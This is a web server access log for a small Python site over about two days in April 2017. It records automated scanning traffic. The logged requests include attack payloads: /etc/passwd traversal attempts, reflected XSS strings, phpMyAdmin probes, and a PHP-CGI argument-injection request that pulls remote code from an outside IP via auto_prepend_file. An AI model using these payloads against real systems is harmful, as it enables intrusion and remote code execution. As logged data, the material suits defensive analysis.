/usr/local/lib/python2.7/dist-packages/sklearn/cross_validation.py:44: DeprecationWarning: This module was deprecated in version 0.18 in favor of the model_selection module into which all the refactored classes and functions are moved. Also note that the interface of the new CV iterators are different from that of this module. This module will be removed in 0.20.
  "This module will be removed in 0.20.", DeprecationWarning)
/usr/local/lib/python2.7/dist-packages/gensim/utils.py:1015: UserWarning: Pattern library is not installed, lemmatization won't be available.
  warnings.warn("Pattern library is not installed, lemmatization won't be available.")
::ffff:140.205.201.38 - - [2017-04-25 10:55:18] "GET /master-status HTTP/1.1" 404 342 0.000782
::ffff:140.205.201.38 - - [2017-04-25 11:02:09] "GET /dfshealth.html HTTP/1.1" 404 342 0.000763
::ffff:140.205.201.38 - - [2017-04-25 11:17:48] "GET /about/ HTTP/1.1" 200 2638 0.001866
::ffff:140.205.201.38 - - [2017-04-25 11:20:20] "GET /dfshealth.jsp HTTP/1.1" 404 342 0.000802
::ffff:140.205.201.38 - - [2017-04-25 11:27:03] "GET /hadoop/dfshealth.jsp HTTP/1.1" 404 342 0.000834
<socket fileno=14>: Invalid HTTP method: '\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
::ffff:140.205.225.185 - - [2017-04-25 11:36:59] " ú +<M                 1                                                                                                                              " 400 - 3.003141
<socket fileno=14>: Invalid HTTP method: '\x00\x0e8\xc5;.\\C\xe3W\xcd\x00\x00\x00\x00\x00'
::ffff:140.205.225.185 - - [2017-04-25 11:43:38] " 8≈;.\C„WÕ     " 400 - 3.002304
::ffff:140.205.201.38 - - [2017-04-25 11:47:14] "GET / HTTP/1.1" 200 2631 0.002705
::ffff:140.205.201.38 - - [2017-04-25 11:51:56] "GET / HTTP/1.1" 200 2631 0.002540
::ffff:140.205.201.38 - - [2017-04-25 11:59:26] "GET / HTTP/1.1" 200 2631 0.004064
::ffff:140.205.201.38 - - [2017-04-25 12:03:56] "POST / HTTP/1.1" 405 323 0.000796
::ffff:140.205.201.38 - - [2017-04-25 12:04:59] "GET /spaces/viewdefaultdecorator.action?decoratorName=file:///etc/passwd HTTP/1.1" 404 342 0.000748
::ffff:140.205.201.38 - - [2017-04-25 12:06:52] "GET /spaces/viewdefaultdecorator.action?decoratorName=file:///etc/passwd HTTP/1.1" 404 342 0.001215
::ffff:140.205.201.38 - - [2017-04-25 12:13:45] "GET /clusters.jsf HTTP/1.1" 404 342 0.000745
::ffff:140.205.201.38 - - [2017-04-25 12:14:16] "GET / HTTP/1.1" 200 2631 0.002253
::ffff:140.205.201.38 - - [2017-04-25 12:14:38] "GET /hwi/ HTTP/1.1" 404 342 0.000744
::ffff:140.205.201.38 - - [2017-04-25 12:14:51] "GET / HTTP/1.1" 200 2631 0.002215
::ffff:140.205.201.38 - - [2017-04-25 12:15:03] "GET / HTTP/1.1" 200 2631 0.002195
::ffff:140.205.201.38 - - [2017-04-25 12:15:05] "HEAD / HTTP/1.1" 200 118 0.002123
::ffff:140.205.201.15 - - [2017-04-25 12:15:23] "GET /?.tmp=t HTTP/1.1" 200 2631 0.002225
::ffff:140.205.201.15 - - [2017-04-25 12:15:23] "GET /static/underscore-min.js HTTP/1.1" 200 14661 0.001506
::ffff:140.205.201.15 - - [2017-04-25 12:15:23] "GET /static/app.js HTTP/1.1" 200 1038 0.001221
::ffff:140.205.201.38 - - [2017-04-25 12:15:29] "GET /'%22+onmouseover=alert()+d='%22 HTTP/1.1" 404 342 0.000806
::ffff:140.205.201.38 - - [2017-04-25 12:15:30] "GET /%27%22%20onmouseover%3Dalert%28%29%20d%3D%27%22 HTTP/1.1" 404 342 0.000738
::ffff:140.205.201.38 - - [2017-04-25 12:15:31] "GET /%2527%2522%2520onmouseover%253Dalert%2528%2529%2520d%253D%2527%2522 HTTP/1.1" 404 342 0.000744
::ffff:140.205.201.38 - - [2017-04-25 12:15:33] "GET /'%22+onmouseover=alert()+d='%22/?.tmp=t HTTP/1.1" 404 342 0.001150
::ffff:140.205.201.38 - - [2017-04-25 12:15:35] "GET /%27%22%20onmouseover%3Dalert%28%29%20d%3D%27%22/?.tmp=t HTTP/1.1" 404 342 0.001155
::ffff:140.205.201.38 - - [2017-04-25 12:15:36] "GET /%2527%2522%2520onmouseover%253Dalert%2528%2529%2520d%253D%2527%2522/?.tmp=t HTTP/1.1" 404 342 0.000767
::ffff:140.205.201.38 - - [2017-04-25 12:15:38] "GET /'%22/%3E%3C/script%3E%3Cscript%3Ealert()%3C/script%3E HTTP/1.1" 404 342 0.000739
::ffff:140.205.201.38 - - [2017-04-25 12:15:41] "GET /%27%22%2f%3E%3C%2fscript%3E%3Cscript%3Ealert%28%29%3C%2fscript%3E HTTP/1.1" 404 342 0.000761
::ffff:140.205.201.38 - - [2017-04-25 12:15:43] "GET /%2527%2522%252f%253E%253C%252fscript%253E%253Cscript%253Ealert%2528%2529%253C%252fscript%253E HTTP/1.1" 404 342 0.000751
::ffff:140.205.201.38 - - [2017-04-25 12:15:45] "GET /'%22/%3E%3C/script%3E%3Cscript%3Ealert()%3C/script%3E/?.tmp=t HTTP/1.1" 404 342 0.000791
::ffff:140.205.201.38 - - [2017-04-25 12:16:01] "GET /%27%22%2f%3E%3C%2fscript%3E%3Cscript%3Ealert%28%29%3C%2fscript%3E/?.tmp=t HTTP/1.1" 404 342 0.000783
::ffff:140.205.201.38 - - [2017-04-25 12:16:20] "GET /%2527%2522%252f%253E%253C%252fscript%253E%253Cscript%253Ealert%2528%2529%253C%252fscript%253E/?.tmp=t HTTP/1.1" 404 342 0.000748
::ffff:140.205.201.38 - - [2017-04-25 12:16:37] "GET / HTTP/1.1" 200 2631 0.003406
::ffff:140.205.201.38 - - [2017-04-25 12:17:03] "GET /admin/ HTTP/1.1" 404 342 0.000761
::ffff:140.205.201.38 - - [2017-04-25 12:21:02] "GET / HTTP/1.1" 200 2631 0.002174
::ffff:140.205.201.42 - - [2017-04-25 12:53:07] "GET /about/ HTTP/1.1" 200 2638 0.001900
::ffff:140.205.201.42 - - [2017-04-25 12:53:22] "POST /gviabfwumlks HTTP/1.1" 404 342 0.027639
::ffff:140.205.201.42 - - [2017-04-25 12:53:22] "GET /gviabfwumlks HTTP/1.1" 404 342 0.000754
::ffff:140.205.201.42 - - [2017-04-25 12:53:22] "DELETE /gviabfwumlks HTTP/1.1" 404 342 0.000811
::ffff:140.205.201.42 - - [2017-04-25 12:55:26] "POST / HTTP/1.1" 405 323 0.028968
::ffff:140.205.201.42 - - [2017-04-25 12:58:51] "GET / HTTP/1.1" 200 2631 0.002212
::ffff:140.205.201.42 - - [2017-04-25 13:00:14] "GET /phpmyadmin/index.php HTTP/1.1" 404 342 0.000735
::ffff:140.205.201.42 - - [2017-04-25 13:00:19] "GET /phpMyAdmin/index.php HTTP/1.1" 404 342 0.000739
::ffff:140.205.201.42 - - [2017-04-25 13:00:24] "GET /pma/index.php HTTP/1.1" 404 342 0.000776
::ffff:140.205.201.42 - - [2017-04-25 13:00:29] "GET /pmd/index.php HTTP/1.1" 404 342 0.000765
::ffff:140.205.201.42 - - [2017-04-25 13:01:39] "GET / HTTP/1.1" 200 2631 0.002184
::ffff:140.205.201.42 - - [2017-04-25 13:03:01] "GET /phpmyadmin/index.php HTTP/1.1" 404 342 0.000743
::ffff:140.205.201.42 - - [2017-04-25 13:03:07] "GET /phpMyAdmin/index.php HTTP/1.1" 404 342 0.001205
::ffff:140.205.201.42 - - [2017-04-25 13:03:12] "GET /pma/index.php HTTP/1.1" 404 342 0.000752
::ffff:140.205.201.42 - - [2017-04-25 13:03:17] "GET /pmd/index.php HTTP/1.1" 404 342 0.000743
::ffff:47.90.92.26 - - [2017-04-25 13:04:56] "GET / HTTP/1.1" 200 2631 0.002207
::ffff:140.205.201.42 - - [2017-04-25 13:11:21] "GET / HTTP/1.1" 200 2631 0.003024
::ffff:140.205.201.42 - - [2017-04-25 13:17:31] "GET / HTTP/1.1" 200 2631 0.002193
::ffff:140.205.201.42 - - [2017-04-25 13:23:08] "GET /jobs/ HTTP/1.1" 404 342 0.000743
::ffff:140.205.201.42 - - [2017-04-25 13:23:58] "GET /ganglia/index.php HTTP/1.1" 404 342 0.000790
::ffff:140.205.201.42 - - [2017-04-25 13:24:04] "GET /index.php HTTP/1.1" 404 342 0.000732
::ffff:172.82.166.210 - - [2017-04-25 13:24:13] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 342 0.000813
::ffff:140.205.201.42 - - [2017-04-25 13:25:22] "GET /rs-status HTTP/1.1" 404 342 0.001155
::ffff:140.205.201.42 - - [2017-04-25 13:28:36] "GET /master-status HTTP/1.1" 404 342 0.000801
::ffff:140.205.201.42 - - [2017-04-25 13:31:02] "GET /dfshealth.html HTTP/1.1" 404 342 0.000733
::ffff:140.205.201.42 - - [2017-04-25 13:34:12] "GET / HTTP/1.1" 200 2631 0.002564
::ffff:140.205.201.42 - - [2017-04-25 13:36:38] "POST / HTTP/1.1" 405 323 0.000781
::ffff:140.205.201.42 - - [2017-04-25 13:41:25] "GET /warning HTTP/1.1" 404 342 0.000747
::ffff:140.205.201.42 - - [2017-04-25 13:46:08] "GET /pleasereadthis HTTP/1.1" 404 342 0.000738
::ffff:140.205.201.42 - - [2017-04-25 13:52:52] "GET /please_read/_search HTTP/1.1" 404 342 0.000763
::ffff:140.205.201.42 - - [2017-04-25 13:56:54] "GET /dfshealth.jsp HTTP/1.1" 404 342 0.000769
::ffff:140.205.201.42 - - [2017-04-25 13:57:50] "GET /hadoop/dfshealth.jsp HTTP/1.1" 404 342 0.000757
::ffff:140.205.201.42 - - [2017-04-25 13:58:13] "GET /solr/ HTTP/1.1" 404 342 0.000788
::ffff:140.205.201.42 - - [2017-04-25 13:58:16] "GET / HTTP/1.1" 200 2631 0.002317
::ffff:140.205.201.42 - - [2017-04-25 13:58:36] "GET /info HTTP/1.1" 404 342 0.000755
::ffff:153.186.222.148 - - [2017-04-25 14:03:56] "GET / HTTP/1.0" 200 2650 0.002180
::ffff:140.205.201.42 - - [2017-04-25 14:11:44] "GET /j_acegi_security_check HTTP/1.1" 404 342 0.000745
::ffff:140.205.201.42 - - [2017-04-25 14:13:25] "GET /admin/ HTTP/1.1" 404 342 0.000739
::ffff:140.205.201.42 - - [2017-04-25 14:13:59] "GET / HTTP/1.1" 200 2631 0.002545
::ffff:218.94.83.138 - - [2017-04-25 14:18:13] "POST /web/text/ HTTP/1.1" 200 654 0.010015
::ffff:218.94.83.138 - - [2017-04-25 14:18:17] "GET / HTTP/1.1" 200 2631 0.002246
::ffff:5.178.86.76 - - [2017-04-25 15:34:31] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000773
::ffff:82.242.37.249 - - [2017-04-25 16:06:31] "GET / HTTP/1.0" 200 2650 0.002199
<socket fileno=14>: Invalid HTTP method: '\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
::ffff:140.205.201.39 - - [2017-04-25 17:54:41] " ú +<M                 1                                                                                                                              " 400 - 3.007957
<socket fileno=14>: Invalid HTTP method: '\x00\x0e8\xc5;.\\C\xe3W\xcd\x00\x00\x00\x00\x00'
::ffff:140.205.201.39 - - [2017-04-25 17:55:28] " 8≈;.\C„WÕ     " 400 - 3.002332
::ffff:14.146.2.42 - - [2017-04-25 18:22:46] "GET / HTTP/1.1" 200 2631 0.002311
::ffff:212.129.5.109 - - [2017-04-25 19:13:59] "HEAD /robots.txt HTTP/1.0" 404 128 0.000713
::ffff:187.207.8.228 - - [2017-04-25 19:32:19] "GET / HTTP/1.0" 200 2650 0.002229
::ffff:95.213.187.189 - - [2017-04-25 20:26:21] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000781
::ffff:139.162.88.63 - - [2017-04-25 20:40:15] "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1" 404 342 0.000740
::ffff:80.82.78.38 - - [2017-04-25 20:47:38] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 342 0.001113
::ffff:91.189.36.109 - - [2017-04-25 20:58:09] "GET / HTTP/1.1" 200 2631 0.002611
::ffff:120.132.3.151 - - [2017-04-25 22:03:11] "GET http://www.qq.com/404/search_children.js HTTP/1.1" 404 342 0.000774
<socket fileno=14>: Invalid HTTP method: '\x04\x01\x00PpTi4\x00'
::ffff:120.132.3.151 - - [2017-04-25 22:03:16] " PpTi4 " 400 - 5.007212
<socket fileno=15>: Invalid HTTP method: '\x05\x01\x00'
::ffff:120.132.3.151 - - [2017-04-25 22:03:16] " " 400 - 5.003984
::ffff:91.189.36.109 - - [2017-04-26 00:18:09] "GET /m/ HTTP/1.1" 404 342 0.000744
::ffff:140.205.225.185 - - [2017-04-26 00:31:30] "GET /about/ HTTP/1.1" 200 2638 0.001875
::ffff:140.205.225.185 - - [2017-04-26 00:31:45] "POST /bjisyvertalo HTTP/1.1" 404 342 0.029913
::ffff:140.205.225.185 - - [2017-04-26 00:31:45] "GET /bjisyvertalo HTTP/1.1" 404 342 0.001113
::ffff:140.205.225.185 - - [2017-04-26 00:31:45] "DELETE /bjisyvertalo HTTP/1.1" 404 342 0.000785
::ffff:140.205.225.185 - - [2017-04-26 00:33:45] "POST / HTTP/1.1" 405 323 0.029140
::ffff:140.205.225.185 - - [2017-04-26 00:34:19] "GET /clusters.jsf HTTP/1.1" 404 342 0.000756
::ffff:140.205.225.185 - - [2017-04-26 00:38:42] "GET / HTTP/1.1" 200 2631 0.003143
::ffff:140.205.225.185 - - [2017-04-26 00:38:52] "GET /phpmyadmin/index.php HTTP/1.1" 404 342 0.000800
::ffff:140.205.225.185 - - [2017-04-26 00:38:57] "GET /phpMyAdmin/index.php HTTP/1.1" 404 342 0.000746
::ffff:140.205.225.185 - - [2017-04-26 00:39:02] "GET /pma/index.php HTTP/1.1" 404 342 0.000783
::ffff:140.205.225.185 - - [2017-04-26 00:39:07] "GET /pmd/index.php HTTP/1.1" 404 342 0.000760
::ffff:140.205.225.185 - - [2017-04-26 00:40:46] "GET /hwi/ HTTP/1.1" 404 342 0.000728
::ffff:140.205.225.185 - - [2017-04-26 00:41:51] "GET /phpmyadmin/index.php HTTP/1.1" 404 342 0.000765
::ffff:140.205.225.185 - - [2017-04-26 00:41:56] "GET /phpMyAdmin/index.php HTTP/1.1" 404 342 0.000828
::ffff:140.205.225.185 - - [2017-04-26 00:42:02] "GET /pma/index.php HTTP/1.1" 404 342 0.000818
::ffff:140.205.225.185 - - [2017-04-26 00:42:07] "GET /pmd/index.php HTTP/1.1" 404 342 0.000753
::ffff:140.205.225.185 - - [2017-04-26 00:45:20] "GET / HTTP/1.1" 200 2631 0.002226
::ffff:47.88.76.188 - - [2017-04-26 00:53:31] "GET / HTTP/1.1" 200 2631 0.004064
::ffff:140.205.225.185 - - [2017-04-26 00:56:11] "GET / HTTP/1.1" 200 2631 0.002168
::ffff:140.205.225.185 - - [2017-04-26 01:01:28] "GET / HTTP/1.1" 200 2631 0.002198
::ffff:140.205.225.185 - - [2017-04-26 01:02:14] "GET /jobs/ HTTP/1.1" 404 342 0.000764
::ffff:140.205.225.185 - - [2017-04-26 01:02:16] "GET /ganglia/index.php HTTP/1.1" 404 342 0.000783
::ffff:140.205.225.185 - - [2017-04-26 01:02:19] "GET /index.php HTTP/1.1" 404 342 0.000741
::ffff:140.205.225.185 - - [2017-04-26 01:02:26] "GET /rs-status HTTP/1.1" 404 342 0.000758
::ffff:140.205.225.185 - - [2017-04-26 01:02:41] "GET /master-status HTTP/1.1" 404 342 0.001017
::ffff:140.205.225.185 - - [2017-04-26 01:02:44] "GET /dfshealth.html HTTP/1.1" 404 342 0.000725
::ffff:140.205.225.185 - - [2017-04-26 01:02:53] "GET / HTTP/1.1" 200 2631 0.002203
::ffff:140.205.225.185 - - [2017-04-26 01:02:56] "POST / HTTP/1.1" 405 323 0.000791
::ffff:140.205.225.185 - - [2017-04-26 01:03:39] "GET /warning HTTP/1.1" 404 342 0.001156
::ffff:140.205.225.185 - - [2017-04-26 01:05:33] "GET /pleasereadthis HTTP/1.1" 404 342 0.000750
::ffff:95.213.187.190 - - [2017-04-26 01:07:09] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000893
::ffff:140.205.225.185 - - [2017-04-26 01:07:38] "GET /please_read/_search HTTP/1.1" 404 342 0.000756
::ffff:140.205.225.185 - - [2017-04-26 01:10:05] "GET /dfshealth.jsp HTTP/1.1" 404 342 0.000755
::ffff:140.205.225.185 - - [2017-04-26 01:12:00] "GET /hadoop/dfshealth.jsp HTTP/1.1" 404 342 0.000757
::ffff:140.205.225.185 - - [2017-04-26 01:16:07] "GET /solr/ HTTP/1.1" 404 342 0.000758
::ffff:140.205.225.185 - - [2017-04-26 01:26:35] "GET / HTTP/1.1" 200 2631 0.002205
::ffff:140.205.225.185 - - [2017-04-26 01:32:44] "GET /info HTTP/1.1" 404 342 0.000746
::ffff:140.205.225.185 - - [2017-04-26 01:34:43] "GET /j_acegi_security_check HTTP/1.1" 404 342 0.000749
::ffff:140.205.225.185 - - [2017-04-26 01:34:54] "GET /admin/ HTTP/1.1" 404 342 0.000731
::ffff:140.205.225.185 - - [2017-04-26 01:35:00] "GET / HTTP/1.1" 200 2631 0.004156
::ffff:185.25.148.240 - - [2017-04-26 02:18:02] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 342 0.000822
::ffff:120.32.66.218 - - [2017-04-26 02:19:08] "CONNECT www.baidu.com HTTP/1.1" 404 342 0.000741
<socket fileno=14>: Invalid HTTP method: '\r\n'
::ffff:120.32.66.218 - - [2017-04-26 02:19:08] "" 404 - 0.000070
::ffff:119.98.106.231 - - [2017-04-26 02:19:08] "GET http://www.123cha.com HTTP/1.1" 404 342 0.000772
<socket fileno=14>: Invalid HTTP method: '\r\n'
::ffff:119.98.106.231 - - [2017-04-26 02:19:08] "" 404 - 0.000074
::ffff:123.21.139.41 - - [2017-04-26 02:28:02] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 342 0.000764
::ffff:123.21.139.41 - - [2017-04-26 02:28:07] "GET /pma/scripts/setup.php HTTP/1.1" 404 342 0.000784
::ffff:123.21.139.41 - - [2017-04-26 02:28:12] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 342 0.000761
::ffff:106.15.33.241 - - [2017-04-26 03:07:21] "GET / HTTP/1.1" 200 2631 0.002210
::ffff:5.178.86.74 - - [2017-04-26 05:44:42] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000781
::ffff:106.14.95.61 - - [2017-04-26 06:29:06] "GET / HTTP/1.1" 200 2631 0.002168
::ffff:14.165.210.166 - - [2017-04-26 06:51:44] "GET / HTTP/1.0" 200 2650 0.002227
::ffff:185.2.83.33 - - [2017-04-26 07:29:29] "GET / HTTP/1.1" 200 2631 0.002451
::ffff:191.96.249.97 - - [2017-04-26 07:43:41] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 404 342 0.000775
<socket fileno=14>: Invalid HTTP method: '\n'
::ffff:191.96.249.97 - - [2017-04-26 07:43:41] "" 404 - 0.000078
::ffff:138.255.210.23 - - [2017-04-26 09:30:03] "GET / HTTP/1.1" 200 2631 0.002240
::ffff:59.110.6.177 - - [2017-04-26 09:40:44] "GET / HTTP/1.1" 200 2631 0.002240
::ffff:5.178.86.75 - - [2017-04-26 10:25:32] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000768
::ffff:185.136.243.2 - - [2017-04-26 12:36:57] "GET / HTTP/1.1" 200 2631 0.002773
::ffff:123.151.42.61 - - [2017-04-26 13:18:32] "GET http://www.baidu.com/ HTTP/1.1" 404 342 0.001023
::ffff:195.154.182.232 - - [2017-04-26 13:19:22] "HEAD /robots.txt HTTP/1.0" 404 128 0.000714
::ffff:5.178.86.75 - - [2017-04-26 14:57:46] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000858
::ffff:114.215.239.201 - - [2017-04-26 15:35:01] "GET / HTTP/1.1" 200 2631 0.002239
::ffff:193.63.58.83 - - [2017-04-26 15:54:12] "GET / HTTP/1.1" 200 2631 0.002295
::ffff:49.65.204.93 - - [2017-04-26 16:30:49] "GET / HTTP/1.1" 200 2631 0.002167
::ffff:49.65.204.93 - - [2017-04-26 16:30:49] "GET /static/css/styles.css HTTP/1.1" 200 353 0.000833
::ffff:49.65.204.93 - - [2017-04-26 16:30:49] "GET /static/underscore-min.js HTTP/1.1" 200 14661 0.001391
::ffff:49.65.204.93 - - [2017-04-26 16:30:49] "GET /static/app.js HTTP/1.1" 200 1038 0.000880
::ffff:49.65.204.93 - - [2017-04-26 16:30:49] "GET /static/css/bootstrap.min.css HTTP/1.1" 200 97640 0.045335
::ffff:116.62.176.205 - - [2017-04-26 17:06:03] "GET / HTTP/1.1" 200 2631 0.002280
<socket fileno=14>: Invalid HTTP method: '\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x001\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
::ffff:140.205.201.31 - - [2017-04-26 18:50:52] " ú +<M                 1                                                                                                                              " 400 - 3.001582
<socket fileno=14>: Invalid HTTP method: '\x00\x0e8\xc5;.\\C\xe3W\xcd\x00\x00\x00\x00\x00'
::ffff:140.205.201.31 - - [2017-04-26 18:53:53] " 8≈;.\C„WÕ     " 400 - 3.002817
::ffff:80.82.78.38 - - [2017-04-26 19:31:06] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 342 0.000754
::ffff:95.213.187.188 - - [2017-04-26 19:33:43] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.001656
::ffff:137.226.113.7 - - [2017-04-26 20:18:33] "GET / HTTP/1.1" 200 2631 0.002206
::ffff:137.226.113.7 - - [2017-04-26 20:18:33] "GET / HTTP/1.1" 200 2631 0.002428
::ffff:137.226.113.7 - - [2017-04-26 20:18:33] "GET / HTTP/1.1" 200 2631 0.001888
::ffff:137.226.113.7 - - [2017-04-26 20:18:33] "GET / HTTP/1.1" 200 2631 0.001743
::ffff:137.226.113.7 - - [2017-04-26 20:18:38] "GET / HTTP/1.1" 200 118 4.695542
::ffff:139.162.88.63 - - [2017-04-26 20:44:02] "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1" 404 342 0.000764
::ffff:47.90.92.26 - - [2017-04-26 21:23:45] "GET / HTTP/1.1" 200 2631 0.002247
::ffff:91.189.36.109 - - [2017-04-26 21:43:21] "GET /m/ HTTP/1.1" 404 342 0.000734
::ffff:139.162.124.167 - - [2017-04-26 22:13:10] "GET / HTTP/1.1" 200 2631 0.002229
::ffff:182.48.105.210 - - [2017-04-26 23:01:08] "GET / HTTP/1.1" 200 2631 0.002316
::ffff:209.126.136.5 - - [2017-04-26 23:38:26] "GET / HTTP/1.1" 200 2631 0.002241
::ffff:5.178.86.75 - - [2017-04-26 23:58:17] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 404 342 0.000787
::ffff:91.189.36.109 - - [2017-04-27 01:38:47] "GET /m/ HTTP/1.1" 404 342 0.000774
::ffff:179.215.14.135 - - [2017-04-27 02:07:34] "GET /cgi/common.cgi HTTP/1.0" 404 361 0.000868
::ffff:179.215.14.135 - - [2017-04-27 02:07:34] "POST /command.php HTTP/1.0" 404 361 0.000741
::ffff:212.183.42.227 - - [2017-04-27 03:36:28] "GET / HTTP/1.0" 200 2650 0.002269
::ffff:140.205.201.33 - - [2017-04-27 03:57:27] "GET /about/ HTTP/1.1" 200 2638 0.001879
::ffff:140.205.201.33 - - [2017-04-27 03:57:49] "POST /aqphdygeomxs HTTP/1.1" 404 342 0.027010
::ffff:140.205.201.33 - - [2017-04-27 03:57:50] "GET /aqphdygeomxs HTTP/1.1" 404 342 0.001109
::ffff:140.205.201.33 - - [2017-04-27 03:57:50] "DELETE /aqphdygeomxs HTTP/1.1" 404 342 0.000728
::ffff:140.205.201.33 - - [2017-04-27 04:00:57] "POST / HTTP/1.1" 405 323 0.028322
::ffff:140.205.201.33 - - [2017-04-27 04:04:10] "GET /clusters.jsf HTTP/1.1" 404 342 0.000782
::ffff:140.205.201.33 - - [2017-04-27 04:14:28] "GET / HTTP/1.1" 200 2631 0.002366
::ffff:140.205.201.33 - - [2017-04-27 04:15:50] "GET /phpmyadmin/index.php HTTP/1.1" 404 342 0.000730
::ffff:140.205.201.33 - - [2017-04-27 04:15:56] "GET /phpMyAdmin/index.php HTTP/1.1" 404 342 0.000733
::ffff:140.205.201.33 - - [2017-04-27 04:16:01] "GET /pma/index.php HTTP/1.1" 404 342 0.000745
::ffff:140.205.201.33 - - [2017-04-27 04:16:06] "GET /pmd/index.php HTTP/1.1" 404 342 0.000735
::ffff:140.205.201.33 - - [2017-04-27 04:17:20] "GET /hwi/ HTTP/1.1" 404 342 0.000731
::ffff:140.205.201.33 - - [2017-04-27 04:21:45] "GET /phpmyadmin/index.php HTTP/1.1" 404 342 0.001050
